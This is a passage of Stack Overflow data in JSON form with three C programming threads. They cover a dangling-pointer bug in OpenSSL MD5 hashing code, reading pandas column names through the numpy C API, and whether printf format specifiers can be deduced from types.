"profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1497991163, "post_id": 44662454, "comment_id": 76310871, "body": "Apparently you cannot, unless you make openssl to output the hash as a printable string. Or if you want to print first few bytes, you need to dereference the pointer. But as @Jean-Fran&#231;oisFabre mentioned, this pointer is invalid as it is pointing to a variable which does not exist anymore."}, {"owner": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "edited": false, "score": 0, "creation_date": 1497991291, "post_id": 44662454, "comment_id": 76310937, "body": "Also see <a href=\"https://wiki.openssl.org/index.php/EVP_Message_Digests\" rel=\"nofollow noreferrer\">EVP Message Digests</a> on the OpenSSL wiki."}, {"owner": {"reputation": 41122, "user_id": 2101267, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/06383b51463f855d7cc0f07d4566bd42?s=128&d=identicon&r=PG", "display_name": "Dark Falcon", "link": "https://stackoverflow.com/users/2101267/dark-falcon"}, "edited": false, "score": 0, "creation_date": 1497991479, "post_id": 44662454, "comment_id": 76311036, "body": "<a href=\"https://stackoverflow.com/questions/6441218/can-a-local-variables-memory-be-accessed-outside-its-scope\" title=\"can a local variables memory be accessed outside its scope\">stackoverflow.com/questions/6441218/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 1588, "user_id": 6082851, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/b14f3cd864bc266a401eca07b4153602?s=128&d=identicon&r=PG", "display_name": "12431234123412341234123", "link": "https://stackoverflow.com/users/6082851/12431234123412341234123"}, "edited": false, "score": 0, "creation_date": 1497994507, "post_id": 44662763, "comment_id": 76312393, "body": "It would make more sense to use <code>size_t</code> for <code>input_len</code>. So you also avoid truncations and other errors (<code>EVP_DigestUpdate()</code> also use size_t)"}], "tags": [], "owner": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "is_accepted": false, "score": 2, "last_activity_date": 1497991788, "creation_date": 1497991788, "answer_id": 44662763, "question_id": 44662454, "link": "https://stackoverflow.com/questions/44662454/openssl-md5-gives-a-different-hash-every-time/44662763#44662763", "title": "OpenSSL MD5 gives a different hash every time", "body": "<p>I think you are close. I would probably change <code>md5_digest_process</code> to:</p>\n\n<pre><code>/* md_digest is declared as unsigned char md_digest[EVP_MAX_MD_SIZE] */\nunsigned int md5_digest_process(EVP_MD* md, unsigned char *input_text, unsigned int input_len, unsigned char* md_digest)\n{\n    int hash_len;\n    EVP_MD_CTX mdctx;\n\n    EVP_MD_CTX_init(&amp;mdctx);\n    EVP_DigestInit_ex(&amp;mdctx, md, NULL);\n    EVP_DigestUpdate(&amp;mdctx, input_text, input_len);\n    EVP_DigestFinal_ex(&amp;mdctx, md_digest, &amp;hash_len);\n    EVP_MD_CTX_cleanup(&amp;mdctx);\n    return hash_len;\n}\n</code></pre>\n\n<p>Then, print <code>md_digest</code> with:</p>\n\n<pre><code>int main()\n{\n  EVP_MD *md;\n  unsigned char hash[EVP_MAX_MD_SIZE];\n  unsigned int hash_len;\n\n  md = md5_digest_init();\n  hash_len = md5_digest_process(md, \"foobar\", 6, hash);\n\n  for(unsigned int i=0; i&lt;hash_len; i++)\n      printf(\"%02x\", hash[i]);\n  printf(\"\\n\");\n\n  return 0;\n}\n</code></pre>\n\n<p>You should also add some error checking.</p>\n"}, {"comments": [{"owner": {"reputation": 846, "user_id": 3301488, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/35848d5d02b8a0b12b9cdc979f88a370?s=128&d=identicon&r=PG&f=1", "display_name": "saruftw", "link": "https://stackoverflow.com/users/3301488/saruftw"}, "edited": false, "score": 0, "creation_date": 1497992250, "post_id": 44662776, "comment_id": 76311399, "body": "Thanks for the clear explanation! So it was the dangling pointer after all?"}, {"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "reply_to_user": {"reputation": 846, "user_id": 3301488, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/35848d5d02b8a0b12b9cdc979f88a370?s=128&d=identicon&r=PG&f=1", "display_name": "saruftw", "link": "https://stackoverflow.com/users/3301488/saruftw"}, "edited": false, "score": 1, "creation_date": 1497992740, "post_id": 44662776, "comment_id": 76311653, "body": "@saruftw: that is only part of it.  There is another aspect to your issue.  I have updated my answer."}], "tags": [], "owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "is_accepted": true, "score": 2, "last_activity_date": 1497992824, "last_edit_date": 1497992824, "creation_date": 1497991856, "answer_id": 44662776, "question_id": 44662454, "link": "https://stackoverflow.com/questions/44662454/openssl-md5-gives-a-different-hash-every-time/44662776#44662776", "title": "OpenSSL MD5 gives a different hash every time", "body": "<p>As stated in comments, <code>md5_digest_process()</code> is returning a pointer to a local variable that goes out of scope when the function exits, leaving the pointer dangling as it is left pointing to invalid memory.</p>\n\n<p>But that doesn't matter to your issue, because you are printing the <em>memory address</em> that the pointer is pointing at, not the <em>data</em> that it is pointing at.  So your printed output is displaying whatever random memory address the local <code>hash</code> variable existed at when the function was called.  That is why you are seeing inconsistent values in your output.  As stated in comments, you need to dereference the pointer in order to print the data that is being pointed at.</p>\n\n<p>If you want to return a pointer to memory that outlives the function, you have to allocate the memory dynamically:</p>\n\n<pre><code>unsigned char* md5_digest_process(EVP_MD* md, unsigned char *input_text, int *hash_len) {\n    unsigned char *hash = (unsigned char *) malloc(EVP_MAX_MD_SIZE);\n    if (!hash) return NULL;\n    EVP_MD_CTX mdctx;\n    EVP_MD_CTX_init(&amp;mdctx);\n    EVP_DigestInit_ex(&amp;mdctx, md, NULL);\n    EVP_DigestUpdate(&amp;mdctx, input_text, strlen(input_text)+1);\n    EVP_DigestFinal_ex(&amp;mdctx, hash, hash_len);\n    EVP_MD_CTX_cleanup(&amp;mdctx);\n    return hash;\n}\n\nint main() {\n  EVP_MD *md = md5_digest_init();\n  int hash_len = 0;\n  unsigned char* res = md5_digest_process(md, \"foobar\", &amp;hash_len);\n  if (res) {\n    for(int i = 0; i &lt; hash_len; ++i) {\n      printf(\"%02x\", res[i]);\n    }\n    free(res)\n  }\n  return 0;\n}\n</code></pre>\n\n<p>Otherwise, the caller will have to allocate the memory and pass it into the function to fill in:</p>\n\n<pre><code>int md5_digest_process(EVP_MD* md, unsigned char *input_text, unsigned char* hash) {\n    EVP_MD_CTX mdctx;\n    int hash_len = 0;\n    EVP_MD_CTX_init(&amp;mdctx);\n    EVP_DigestInit_ex(&amp;mdctx, md, NULL);\n    EVP_DigestUpdate(&amp;mdctx, input_text, strlen(input_text)+1);\n    EVP_DigestFinal_ex(&amp;mdctx, hash, &amp;hash_len);\n    EVP_MD_CTX_cleanup(&amp;mdctx);\n    return hash_len;\n}\n\nint main() {\n  EVP_MD *md = md5_digest_init();\n  unsigned char hash[EVP_MAX_MD_SIZE];\n  int hash_len = md5_digest_process(md, \"foobar\", hash);\n  for(int i = 0; i &lt; hash_len; ++i) {\n    printf(\"%02x\", res[i]);\n  }\n  return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 846, "user_id": 3301488, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/35848d5d02b8a0b12b9cdc979f88a370?s=128&d=identicon&r=PG&f=1", "display_name": "saruftw", "link": "https://stackoverflow.com/users/3301488/saruftw"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1131, "favorite_count": 1, "accepted_answer_id": 44662776, "answer_count": 2, "score": 1, "last_activity_date": 1497992824, "creation_date": 1497990605, "last_edit_date": 1497991362, "question_id": 44662454, "link": "https://stackoverflow.com/questions/44662454/openssl-md5-gives-a-different-hash-every-time", "title": "OpenSSL MD5 gives a different hash every time", "body": "<p>I'm trying to create a certain modular code using OpenSSL's EVP API for MD5 by passing the <code>EVP_MD</code> object within functions as shown below.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;openssl/evp.h&gt;\n\nEVP_MD* md5_digest_init() {\n  OpenSSL_add_all_digests();\n  EVP_MD *md = EVP_get_digestbyname(\"MD5\");\n  if(!md) {\n     printf(\"Unable to init MD5 digest\\n\");\n     exit(1);\n   }\n  return md;\n}\n\nunsigned char *md5_digest_process(EVP_MD* md, unsigned char *input_text) {\n    EVP_MD_CTX mdctx;\n    unsigned char hash[EVP_MAX_MD_SIZE];\n    int hash_len;\n    EVP_MD_CTX_init(&amp;mdctx);\n    EVP_DigestInit_ex(&amp;mdctx, md, NULL);\n    EVP_DigestUpdate(&amp;mdctx, input_text, strlen(input_text)+1);\n    EVP_DigestFinal_ex(&amp;mdctx, hash, &amp;hash_len);\n    EVP_MD_CTX_cleanup(&amp;mdctx);\n    return hash;\n}\n\nint main() {\n  EVP_MD *md;\n  md = md5_digest_init();\n  unsigned char* res;\n  res = md5_digest_process(md, \"foobar\");\n  printf(\"%02x\", res);\n  return 0;\n}\n</code></pre>\n\n<p>The problem is that on executing the code every time, I obtain a different hash value for the same text.</p>\n\n<p>Such as</p>\n\n<pre><code>585c64a0\n554454a0\n5f75a4a0, etc\n</code></pre>\n\n<p>MD5 is deterministic and such an issue should not exist. Any reason why such as error exists? Also, the passing of the <code>EVP_MD</code> object within functions is important to me.</p>\n\n<p>EDIT:</p>\n\n<p>Replacing the final <code>printf</code> with the following code </p>\n\n<pre><code>for(int i = 0; i &lt; 16; ++i)\n    printf(\"%02x\", res[i]);\n</code></pre>\n\n<p>I get the following output.</p>\n\n<pre><code>b4000000000000000100000000000000\n</code></pre>\n\n<p>However, this stays the same for all executions. But I'm guessing that this hash isn't right.</p>\n"}, {"tags": ["python", "c", "numpy"], "comments": [{"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1497992614, "post_id": 44662225, "comment_id": 76311588, "body": "Does <code>length</code> have the value you expected?"}, {"owner": {"reputation": 2214, "user_id": 806808, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1c0b2b7f56ea26e55834aeed7a16e989?s=128&d=identicon&r=PG", "display_name": "Andrey Belykh", "link": "https://stackoverflow.com/users/806808/andrey-belykh"}, "reply_to_user": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1498052913, "post_id": 44662225, "comment_id": 76340140, "body": "Yes, the length is 3"}], "owner": {"reputation": 2214, "user_id": 806808, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1c0b2b7f56ea26e55834aeed7a16e989?s=128&d=identicon&r=PG", "display_name": "Andrey Belykh", "link": "https://stackoverflow.com/users/806808/andrey-belykh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 181, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1497989654, "creation_date": 1497989654, "question_id": 44662225, "link": "https://stackoverflow.com/questions/44662225/how-to-get-strings-values-from-numpy-ndarray-of-npy-object", "title": "How to get strings values from numpy.ndarray of NPY_OBJECT", "body": "<p>I am trying to get the names of columns in pandas.DataFrame using C API for python and numpy. I am using Microsoft Visual Studio 2015 under Windows 7 and 64 bit python v3.6. I am able to get to the df.axes[1].values, however when I use PyArray_GETPTR1, the result seems to be invalid.</p>\n\n<p>Here is my code:</p>\n\n<pre><code>// Initialize python\nPy_SetPythonHome(L\"C:\\\\Program Files\\\\Python36\");\nPy_Initialize();\n\n// Initialize numpy\nimport_array();\n\n// Build script\nPyCompilerFlags flags;\nflags.cf_flags = PyCF_SOURCE_IS_UTF8;\nPyObject* compiled = Py_CompileStringFlags(\n    \"import numpy as np\\n\"\n    \"import pandas as pd\\n\"\n    \"def ReturnDataFrame():\\n\"\n    \"    df = pd.DataFrame({'AAA' : [4,5,6,7], 'BBB' : [10,20,30,40],'CCC' : [100,50,-30,-50]})\\n\"\n    \"    return df\\n\",\n    \"test.py\", Py_file_input, &amp;flags\n);\nPyObject* codeModule = PyImport_ExecCodeModule(\"test.py\", compiled);\n\n// Call the function\nPyObject* pFunc = PyObject_GetAttrString(codeModule, \"ReturnDataFrame\");\nPyObject* pReturn = PyObject_CallObject(pFunc, nullptr);\nPy_XDECREF(pFunc);\n\n// Display column headers\nPyObject* axes = PyObject_GetAttrString(pReturn, \"axes\");\nPyObject* columnLabelsIndex = PyList_GET_ITEM(axes, 1);\nPyObject* columns = PyObject_GetAttrString(columnLabelsIndex, \"values\");\nconst char* typeName = columns-&gt;ob_type-&gt;tp_name; // == \"numpy.ndarray\"\nPyArrayObject* columnArray = (PyArrayObject*)columns;\nint length = PyArray_DIMS(columnArray)[0];\nint elementType = PyArray_TYPE(columnArray); // == NPY_OBJECT\nfor (int i = 0; i &lt; length; i++)\n{\n    PyObject* pElementValue = (PyObject*)PyArray_GETPTR1(columnArray, i);\n    typeName = pElementValue-&gt;ob_type-&gt;tp_name; // invalid\n    char* str = PyUnicode_AsUTF8(pElementValue);\n    std::cout &lt;&lt; str;\n    std::cout &lt;&lt; \" \";\n}\nstd::cout &lt;&lt; \"\\n\";\n</code></pre>\n\n<p>I would appreciate any input on why these values are invalid.</p>\n"}, {"tags": ["c", "types", "printf", "format-specifiers"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1497989225, "post_id": 44662078, "comment_id": 76309837, "body": "Some compilers (GCC, Clang) issue warnings for mismatched formats and arguments. But to answer your question: No it&#39;s not really possible. C doesn&#39;t have built-in capabilities of <a href=\"https://en.wikipedia.org/wiki/Type_introspection\" rel=\"nofollow noreferrer\">introspection</a> or <a href=\"https://en.wikipedia.org/wiki/Reflection_(computer_programming)\" rel=\"nofollow noreferrer\">reflection</a>. You can not in a standard way get the types of data at run-time."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1497989271, "post_id": 44662078, "comment_id": 76309864, "body": "Also, with GCC and Clang you can easily turn specific warnings into errors. Or turn <i>all</i> warnings into errors, and then disable the errors for specific warnings."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1497989272, "post_id": 44662078, "comment_id": 76309866, "body": "Format specifiers aren&#39;t just for types. E.g. <code>%o</code> and <code>%x</code> both take <code>unsigned int</code>; <code>%e</code>, <code>%f</code>, <code>%g</code> all take <code>double</code>; <code>%d</code>, <code>%i</code>, <code>%c</code> all take <code>int</code>. That&#39;s why you can&#39;t (in general) deduce them from the arguments."}, {"owner": {"reputation": 5359, "user_id": 7851115, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/uyswM.jpg?s=128&g=1", "display_name": "Joshua Detwiler", "link": "https://stackoverflow.com/users/7851115/joshua-detwiler"}, "edited": false, "score": 1, "creation_date": 1497989332, "post_id": 44662078, "comment_id": 76309894, "body": "Because the programmer creates the variables, the programmer is expected to know the type of the variable, and thus the responsibility lies with the caller. There is no nice programmatic way to deal with format specifiers."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1497989534, "post_id": 44662078, "comment_id": 76309980, "body": "If it was possible, why would C require to do it manually?"}, {"owner": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 1, "creation_date": 1497989637, "post_id": 44662078, "comment_id": 76310026, "body": "In theory it is possible.  I believe it can be done using variadic templates and constexpr format string scanning.  Not a simple task, for dubious gains, but it is possible.  If you are really concerned about type-correctness,you should use streams."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 1, "creation_date": 1497990653, "post_id": 44662078, "comment_id": 76310555, "body": "@Micha&#235;lRoy The question is about C."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1497990711, "post_id": 44662078, "comment_id": 76310590, "body": "&quot;They do have warnings&quot;. C does not have any cocoon, that comes from the OS and from useful but not obligitary compiler warnings. Other languages might help you more, but C is brutally efficient."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497993113, "post_id": 44662078, "comment_id": 76311822, "body": "<code>gcc -std=c11 -Wall -Wextra -Wconversion -Wpedantic -Werror \u2026</code> et voila! Life would be so much safer if the producers of firearms would not drill that long hole in the barrels. Oh, wait, then these things would not make sense \u2026"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497997289, "post_id": 44662078, "comment_id": 76313390, "body": "@Olaf <a href=\"https://stackoverflow.com/questions/44662078/deduce-format-specifier-from-data-type/44663207?noredirect=1#comment76311822_44662078\">Good idea</a>, yet that will not warn about <code>printf(&quot;%hhd, some_int);</code> as sub-<code>int&#47;unsigned</code> print specifiers match all <code>int&#47;unsigned</code>."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1497997920, "post_id": 44662078, "comment_id": 76313594, "body": "@chux: Yes, it was a shot in the dark. It warns about UB, though. If one tends to shoot his feet, he should not wear a gun. IOW: C is not a language for uncautious people. Hence my nit-picking. Nevertheless, one should not try to make C a different language. Macros are useful, but if getting too fancy with them one eventually ends in macro hell. Maybe all beginners have to cross that river - the better ones accept advice, the mediocre (or those which don&#39;t get this advice) do it once."}], "answers": [{"tags": [], "owner": {"reputation": 66610, "user_id": 2411320, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/5kF5N.jpg?s=128&g=1", "display_name": "gsamaras", "link": "https://stackoverflow.com/users/2411320/gsamaras"}, "is_accepted": true, "score": 2, "last_activity_date": 1497989393, "creation_date": 1497989393, "answer_id": 44662164, "question_id": 44662078, "link": "https://stackoverflow.com/questions/44662078/deduce-format-specifier-from-data-type/44662164#44662164", "title": "Deduce format specifier from data type?", "body": "<blockquote>\n  <p>Deduce format specifier from data type?</p>\n</blockquote>\n\n<p><em>No</em>.</p>\n\n<p>As melpomene stated:</p>\n\n<p>\"Format specifiers aren't just for types. E.g. <code>%o</code> and <code>%x</code> both take <code>unsigned int</code>; <code>%e</code>, <code>%f</code>, <code>%g</code> all take <code>double</code>; <code>%d</code>, <code>%i</code>, <code>%c</code> all take <code>int</code>. That's why you can't (in general) deduce them from the arguments.\"</p>\n\n<p>Point is that if such a functionality existed, then would it deduce <code>unsiged int</code> to <code>%o</code> or <code>%x</code>, for example? And so on . . .</p>\n\n<hr>\n\n<p>About whether some cases should issue a warning or an issue, you should think about how casting works in <a href=\"/questions/tagged/c\" class=\"post-tag\" title=\"show questions tagged &#39;c&#39;\" rel=\"tag\">c</a>, and when it does make sense to allow something or not. In GCC, you could of course treat warning(s) as error(s):</p>\n\n<pre><code>-Werror\nMake all warnings into errors.\n\n-Werror=\nMake the specified warning into an error. The specifier for a warning is appended; for example -Werror=switch turns the warnings controlled by -Wswitch into errors. This switch takes a negative form, to be used to negate -Werror for specific warnings; for example -Wno-error=switch makes -Wswitch warnings not be errors, even when -Werror is in effect.\n\nThe warning message for each controllable warning includes the option that controls the warning. That option can then be used with -Werror= and -Wno-error= as described above. (Printing of the option in the warning message can be disabled using the -fno-diagnostics-show-option flag.)\n\nNote that specifying -Werror=foo automatically implies -Wfoo. However, -Wno-error=foo does not imply anything.\n</code></pre>\n\n<p>as you can read <a href=\"https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html\" rel=\"nofollow noreferrer\">here</a>.</p>\n"}, {"comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497996321, "post_id": 44663207, "comment_id": 76313070, "body": "There is a defect report about <code>_Generic</code>. Some interpretation would be left to the implementation. It also will not work as it should with e.g. <code>size_t</code> which is a <code>typedef</code> to a standard type, but uses a distinct conversion type specifier."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497996558, "post_id": 44663207, "comment_id": 76313169, "body": "@Olaf Concerning &quot;<code>size_t</code> which is a <code>typedef</code>&quot; can be handled with levels of <code>_Generic</code>.  E.g. Top level uses <code>unsigned, unsigned, long, unsigned long long</code> and <code>default</code>.  <code>default</code> uses and 2nd level <i>Generic</i> which has <code>size_t</code>.  This does not always provide the <code>z</code>, yet allows code to distinguish if it is important.  IOWs a <i>comparable</i> specifier can be had."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497997236, "post_id": 44663207, "comment_id": 76313374, "body": "Please read 6.5.1.1p2: &quot;\u2026 No two generic associations in the same generic selection shall specify compatible types \u2026&quot; - do you disagree the alias <code>typedef unsigned int size_t;</code> is compatible with <code>unsigned int</code>? Read the report; there are more problems. It explicitly lists clang and gcc as non-identical implementations. Apart from this: That&#39;s way too much obfuscation for a non-existent problem. C is statically typed, all types are known at compile-time and printing typically uses known types. Special output needs additional care (as the linked examples show). Solution looking for problem."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497997747, "post_id": 44663207, "comment_id": 76313547, "body": "@Olaf I was not suggesting  <code>size_t</code> and <code>unsigned</code> in the same generic selection - but at different levels. Terse example:  <code>#define info2(X) _Generic((X), \\     size_t: &quot;z&quot;, \\     default: &quot;?&quot; \\ )   #define info(X) _Generic((X), \\   unsigned long long: &quot;ull&quot;, \\   unsigned long: &quot;ul&quot;, \\   unsigned: &quot;u&quot;, \\   default: info2(X) \\   )  int main() {   size_t sz;   puts(info(sz));   unsigned u;   puts(info(u)); }</code>"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497998069, "post_id": 44663207, "comment_id": 76313639, "body": "Ok, that might work. But what if <code>size_t</code> is a compiler-additional type. gcc for instance defines a lot of internal types and macros to keep the headers more clean (e.g. <code>INT_MIN</code> etc are defined that way). Honestly: do you really recommend all this? If you only have a hammer, every problem looks like a nail. Some problems just don&#39;t work well with a hammer. And itf there is a lot of output, dynamic languages like Python are definitively the better choice."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497999072, "post_id": 44663207, "comment_id": 76313944, "body": "@Olaf The <a href=\"https://stackoverflow.com/questions/44662078/deduce-format-specifier-from-data-type/44663207?noredirect=1#comment76313547_44663207\">2 level idea</a> would certainly work with &quot;<code>size_t</code> is a compiler-additional type&quot;.  Levels can be added if needed.  GTG"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497999612, "post_id": 44663207, "comment_id": 76314099, "body": "\u2026 making the whole macro hell implementtion-specific. Wasn&#39;t exactly <b>that</b> the thing to avoid? Too fancy, indeed."}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 1, "last_activity_date": 1497996361, "last_edit_date": 1497996361, "creation_date": 1497993722, "answer_id": 44663207, "question_id": 44662078, "link": 